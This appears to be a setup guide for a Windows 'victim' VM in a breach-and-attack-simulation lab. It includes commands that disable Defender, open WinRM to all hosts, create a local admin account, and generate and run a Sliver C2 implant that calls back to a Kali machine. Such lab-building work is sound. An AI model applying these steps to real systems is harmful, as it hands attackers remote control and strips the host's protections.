# Windows Victim VM Setup Guide
# =============================

This guide configures a Windows VM to be used as the target for BAS attack execution and telemetry collection.

## Prerequisites

- Windows 10/11 or Windows Server 2019/2022 VM
- Network connectivity to Kali Linux (BAS platform)
- Administrator access on Windows VM

## Step 1: Network Configuration

### Configure Static IP (Recommended)

1. Open **Settings** → **Network & Internet** → **Ethernet**
2. Click **Change adapter options**
3. Right-click your network adapter → **Properties**
4. Select **Internet Protocol Version 4 (TCP/IPv4)** → **Properties**
5. Select **Use the following IP address**:
   ```
   IP Address: 192.168.56.101 (or your lab subnet)
   Subnet Mask: 255.255.255.0
   Default Gateway: 192.168.56.1
   ```
6. Set DNS servers:
   ```
   Preferred: 8.8.8.8
   Alternate: 8.8.4.4
   ```

## Step 2: Enable PowerShell Remoting

PowerShell remoting is required for telemetry collection and attack execution.

### Open PowerShell as Administrator and run:

```powershell
# Enable PowerShell remoting
Enable-PSRemoting -Force

# Set trusted hosts (allow connections from Kali)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force

# Configure WinRM service
Set-Service WinRM -StartupType Automatic
Start-Service WinRM

# Configure firewall rules
Enable-NetFirewallRule -DisplayGroup "Windows Remote Management"
Enable-NetFirewallRule -DisplayGroup "Remote Event Log Management"

# Verify configuration
Test-WSMan
Get-Service WinRM
```

### Expected Output:
```
wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
ProductVendor   : Microsoft Corporation
ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0
```

## Step 3: Create BAS Service Account

Create a dedicated account for BAS operations:

```powershell
# Create local user for BAS
$Password = Read-Host -AsSecureString "Enter password for BAS account"
New-LocalUser -Name "BASAdmin" -Password $Password -FullName "BAS Administrator" -Description "Account for BAS platform operations"

# Add to Administrators group
Add-LocalGroupMember -Group "Administrators" -Member "BASAdmin"

# Verify
Get-LocalUser -Name "BASAdmin"
```

## Step 4: Configure Windows Defender (Lab Only)

**WARNING: Only disable Defender in isolated lab environments!**

```powershell
# Disable real-time protection (lab only)
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable cloud-delivered protection
Set-MpPreference -DisableCloudBasedProtection $true

# Disable automatic sample submission
Set-MpPreference -DisableAutomaticSampleSubmission $true

# Add exclusion for BAS operations (optional)
Add-MpPreference -ExclusionPath "C:\BAS"
```

## Step 5: Install Sliver Agent

### On Kali (Sliver Server):

```bash
# Start Sliver server
sliver-server

# Inside sliver-server console:
new-operator --name bas-platform --lhost <kali-ip>

# Generate implant for Windows
generate --mtls <kali-ip> --os windows --arch amd64 --format exe --save /tmp/bas_implant.exe

# Start listener
mtls
```

### On Windows VM:

1. Transfer `bas_implant.exe` from Kali to Windows
2. Run the implant (it will connect back to Sliver):
   ```powershell
   # Run implant (will appear as sliver session)
   .\bas_implant.exe
   ```

3. Verify connection in Sliver:
   ```bash
   sessions
   ```

## Step 6: Enable Required Logging

### Enable PowerShell Script Block Logging:

```powershell
# Enable PowerShell logging
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# Enable Module Logging
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1
```

### Enable Process Creation Auditing:

```powershell
# Enable process creation auditing
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Enable command line in process creation events
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1
```

## Step 7: Verify Setup

### Test PowerShell Remoting from Kali:

```bash
# Test WinRM connectivity
crackmapexec winrm <windows-ip>

# Or use evil-winrm
evil-winrm -i <windows-ip> -u BASAdmin -p <password>
```

### Test from BAS Platform:

```bash
# Start API
cd /mnt/okcomputer/output/bas_platform
./run.sh

# In another terminal, test telemetry collection
curl -X POST "http://localhost:8000/api/v1/telemetry/start/192.168.56.102"

# Get latest telemetry
curl "http://localhost:8000/api/v1/telemetry/latest"
```

## Step 8: Create VM Snapshot

**IMPORTANT: Create a snapshot before running any attacks!**

```powershell
# If using VMware/VirtualBox, create snapshot through GUI
# Or use VBoxManage:
# VBoxManage snapshot "Windows-VM" take "Clean-State-Before-BAS"
```

## Network Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                         LAB NETWORK                          │
│                     (192.168.56.0/24)                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────────────┐        ┌─────────────────────┐    │
│  │   Kali Linux        │        │   Windows 10/11     │    │
│  │   (BAS Platform)    │◄──────►│   (Victim VM)       │    │
│  │   192.168.56.101    │  WinRM │   192.168.56.102    │    │
│  │                     │   +    │                     │    │
│  │   - FastAPI         │ Sliver │   - PowerShell      │    │
│  │   - Sliver Server   │   C2   │   - Sliver Agent    │    │
│  │   - Telemetry       │        │   - Logging Enabled │    │
│  └─────────────────────┘        └─────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## Troubleshooting

### PowerShell Remoting Issues:

```powershell
# Reset WinRM configuration
Disable-PSRemoting -Force
Enable-PSRemoting -Force -SkipNetworkProfileCheck

# Check WinRM listeners
winrm enumerate winrm/config/listener

# Test local remoting
Invoke-Command -ComputerName localhost -ScriptBlock { hostname }
```

### Network Connectivity:

```powershell
# Check firewall
Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*Remote*"}

# Test port connectivity
Test-NetConnection -ComputerName <kali-ip> -Port 8000
```

### Sliver Connection Issues:

```bash
# On Kali - check Sliver server
systemctl status sliver
sliver-server

# Inside sliver-server
jobs  # Check listeners
sessions  # Check active sessions
```

## Security Notes

1. **Isolate the lab network** - Never connect to production networks
2. **Use snapshots** - Always revert to clean state after testing
3. **Monitor logs** - Check Windows Event Viewer for attack artifacts
4. **Limit exposure** - Firewall rules should only allow lab IPs

## Next Steps

After setup is complete:

1. Update `.env` file with victim IP and credentials
2. Start BAS API: `./run.sh`
3. Access API docs: http://localhost:8000/docs
4. Execute test attack:
   ```bash
   curl -X POST "http://localhost:8000/api/v1/attacks/execute" \
     -H "Content-Type: application/json" \
     -d '{"technique_id": "T1087", "target_ip": "192.168.56.101"}'
   ```
